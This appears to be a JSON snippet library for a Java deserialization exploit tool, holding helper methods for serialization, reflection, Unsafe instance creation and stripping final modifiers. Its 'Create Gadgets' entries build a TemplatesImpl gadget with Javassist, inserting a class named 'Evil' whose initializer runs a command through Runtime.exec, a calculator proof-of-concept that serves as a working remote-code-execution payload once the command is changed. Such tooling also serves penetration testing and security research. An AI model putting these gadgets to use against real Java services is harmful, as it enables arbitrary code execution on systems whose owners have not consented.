{
  "menuItems": [
    {
      "name": "Unserialize",
      "code": "    public static void unserialize(String base) throws IOException, ClassNotFoundException {\n        byte[] result = Base64.getDecoder().decode(base);\n        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(result);\n        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);\n        objectInputStream.readObject();\n    }",
      "imports": [
        "java.io.ByteArrayInputStream",
        "java.io.IOException",
        "java.io.ObjectInputStream",
        "java.util.Base64",
        "java.io.ClassNotFoundException"
      ],
      "mavenDependencies": [
      ]
    },
    {
      "name": "Serialize",
      "code": "    public static String serialize(Object object) throws IOException {\n        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);\n        objectOutputStream.writeObject(object);\n        return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());\n    }",
      "imports": [
        "java.io.ByteArrayOutputStream",
        "java.io.ObjectOutputStream",
        "java.util.Base64",
        "java.io.IOException"
      ],
      "mavenDependencies": [
      ]
    },
    {
      "name": "Get Field Method",
      "code": "    public static Field getField(Class<?> clazz, String fieldName) {\n        Field field = null;\n        try {\n            field = clazz.getDeclaredField(fieldName);\n            field.setAccessible(true);\n        } catch (NoSuchFieldException e) {\n            if (clazz.getSuperclass() != null) {\n                field = getField(clazz.getSuperclass(), fieldName);\n            }\n        }\n        return field;\n    }",
      "imports": [
        "java.lang.reflect.Field",
        "java.lang.NoSuchFieldException"
      ],
      "mavenDependencies": [
      ]
    },
    {
      "name": "Get Field Value Method",
      "code": "public static Object getFieldValue(Object obj, String fieldName) throws Exception {\n    Field field = obj.getClass().getDeclaredField(fieldName);\n    field.setAccessible(true);\n    return field.get(obj);\n}",
      "imports": [
        "java.lang.reflect.Field"
      ],
      "mavenDependencies": [
      ]
    },
    {
      "name": "New Instance",
      "code": "public static Object newInstance(String className, Object... args) throws Exception {\n        Constructor<?> ctor = Class.forName(className).getDeclaredConstructors()[0];\n        ctor.setAccessible(true);\n        return ctor.newInstance(args);\n    }",
      "imports": [
        "java.lang.reflect.Constructor"
      ],
      "mavenDependencies": [
      ]
    },
    {
      "name": "Set Field Value ",
      "code": "public static void setFieldValue(Object object, String field, Object arg) throws NoSuchFieldException, IllegalAccessException {\n    Field f = object.getClass().getDeclaredField(field);\n    f.setAccessible(true);\n    f.set(object, arg);\n}\n",
      "imports": [
        "java.lang.reflect.Field"
      ],
      "mavenDependencies": [
      ]
    },
    {
      "name": "Set Final Static",
      "code": "public static void setFinalStatic(Field field) throws NoSuchFieldException, IllegalAccessException {\n    field.setAccessible(true);\n    Field modifiersField = Field.class.getDeclaredField(\"modifiers\");\n    modifiersField.setAccessible(true);\n    modifiersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);\n}",
      "imports": [
        "java.lang.reflect.Field",
        "java.lang.reflect.Modifier"
      ],
      "mavenDependencies": [
      ]
    },
    {
      "name": "Get First Constructor Method",
      "code": "    public static Constructor<?> getFirstCtor(String name) throws Exception {\n        Constructor<?> ctor = Class.forName(name).getDeclaredConstructors()[0];\n        ctor.setAccessible(true);\n        return ctor;\n    }",
      "imports": [
        "java.lang.reflect.Constructor"
      ],
      "mavenDependencies": [
      ]
    },
    {
      "name": "Unsafe Reflector",
      "subItems": [
        {
          "name": "allocateInstance",
          "code": "    // 创建实例对象（跳过构造方法）\n    public static <T> T allocateInstance(Class<T> cls) throws Exception {\n        Field theUnsafe = Unsafe.class.getDeclaredField(\"theUnsafe\");\n        theUnsafe.setAccessible(true);\n        Unsafe unsafe = (Unsafe) theUnsafe.get(null);\n        return (T) unsafe.allocateInstance(cls);\n    }",
          "imports": [
            "sun.misc.Unsafe",
            "java.lang.reflect.Field"
          ],
          "mavenDependencies": [
          ]
        }
      ]
    },
    {
      "name": "Create Gadgets",
      "subItems": [
        {
          "name": "createTemplatesImpl no lib",
          "code": "// 使用示例 Boolean.parseBoolean(System.getProperty(\"properXalan\", \"false\")) ? createTemplatesImpl(Class.forName(\"org.apache.xalan.xsltc.trax.TemplatesImpl\"), Class.forName(\"org.apache.xalan.xsltc.runtime.AbstractTranslet\"), Class.forName(\"org.apache.xalan.xsltc.trax.TransformerFactoryImpl\")) : createTemplatesImpl( TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);\n    public static <T> T createTemplatesImpl(Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {\n        T templates = tplClass.getDeclaredConstructor().newInstance();\n\n        ClassPool pool = ClassPool.getDefault();\n        CtClass clas = pool.makeClass(\"Evil\");\n        pool.insertClassPath(new ClassClassPath(abstTranslet));\n        String cmd = \"Runtime.getRuntime().exec(\\\"open -a Calculator\\\");\";\n        clas.makeClassInitializer().insertBefore(cmd);\n        clas.setSuperclass(pool.getCtClass(abstTranslet.getName()));\n\n        clas.writeFile(\"./\");\n        byte[] clasBytecode = clas.toBytecode();\n\n        // Set fields using reflection\n        Field bytecodesField = templates.getClass().getDeclaredField(\"_bytecodes\");\n        bytecodesField.setAccessible(true);\n        bytecodesField.set(templates, new byte[][]{clasBytecode, clasBytecode});\n\n        Field nameField = templates.getClass().getDeclaredField(\"_name\");\n        nameField.setAccessible(true);\n        nameField.set(templates, \"Pwnr\");\n\n        Field tfactoryField = templates.getClass().getDeclaredField(\"_tfactory\");\n        tfactoryField.setAccessible(true);\n        tfactoryField.set(templates, transFactory.getDeclaredConstructor().newInstance());\n\n        return templates;\n    }",
          "imports": [
            "javassist.ClassPool",
            "javassist.CtClass",
            "java.io.IOException",
            "java.io.ByteArrayOutputStream",
            "java.lang.reflect.Field",
            "javassist.ClassClassPath"
          ],
          "mavenDependencies": [
            {
              "groupId": "org.javassist",
              "artifactId": "javassist",
              "version": "3.29.0-GA"
            }
          ]
        },
        {
          "name": "createTemplatesImpl base",
          "code": "    public static byte[] getTemplates() throws CannotCompileException, IOException, NotFoundException {\n        ClassPool classPool = ClassPool.getDefault();\n        // 生成一个随机的类名\n        String randomClassName = \"Test_\" + UUID.randomUUID().toString().replace(\"-\", \"\");\n        CtClass ctClass = classPool.makeClass(randomClassName);\n        ctClass.setSuperclass(classPool.get(\"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\"));\n        String block = \"Runtime.getRuntime().exec(\\\"open -a Calculator\\\");\";\n        ctClass.makeClassInitializer().insertBefore(block);\n        return ctClass.toBytecode();\n    }",
          "imports": [
            "javassist.ClassPool",
            "javassist.CtClass",
            "java.io.IOException",
            "java.io.ByteArrayOutputStream",
            "javassist.CannotCompileException",
            "javassist.NotFoundException",
            "java.lang.reflect.Field",
            "javassist.ClassClassPath",
            "java.util.UUID"
          ],
          "mavenDependencies": [
            {
              "groupId": "org.javassist",
              "artifactId": "javassist",
              "version": "3.29.0-GA"
            }
          ]
        }
      ]
    }
  ]
}
